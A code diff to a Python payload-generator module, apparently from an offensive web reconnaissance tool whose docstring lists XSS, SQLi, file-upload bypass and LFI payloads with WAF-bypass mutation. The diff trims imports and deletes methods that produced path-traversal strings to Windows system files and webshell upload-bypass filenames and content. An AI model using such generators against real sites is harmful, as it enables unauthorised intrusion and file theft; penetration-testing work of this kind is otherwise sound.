@@ -4,11 +4,10 @@ Tạo payload: XSS, SQLi, File Upload Bypass, LFI
 Mutate payload để bypass WAF
 """
 
-import random
 import logging
 import base64
 import re
-from typing import Dict, List, Optional
+from typing import Dict, List
 
 logger = logging.getLogger("recon.payload_gen")
 
@@ -250,26 +249,6 @@ class PayloadGenerator:
         # Mutate for WAF bypass
         mutated = self._mutate_sqli(payloads)
         return payloads + mutated
-
-    def generate_lfi(self, context: str = "linux") -> List[str]:
-        """Generate LFI payloads"""
-        base = LFI_BASE.copy()
-        if context == "windows":
-            base.extend([
-                "../../../../windows/system32/drivers/etc/hosts",
-                "../../../../boot.ini",
-                "../../../../windows/win.ini",
-            ])
-        return base
-
-    def generate_upload_bypass(self, ext: str = "php") -> Dict[str, List[str]]:
-        """Generate file upload bypass payloads"""
-        return {
-            "filenames": [f"shell.{ext}.{bypass}" for bypass in UPLOAD_BYPASS["double_extension"]],
-            "content_types": UPLOAD_BYPASS["content_type"],
-            "magic_bytes": UPLOAD_BYPASS["magic_bytes"],
-            "webshells": UPLOAD_BYPASS["webshell_content"],
-        }
 
     def generate_rce(self, context: str = "linux") -> List[str]:
         """Generate RCE payloads"""
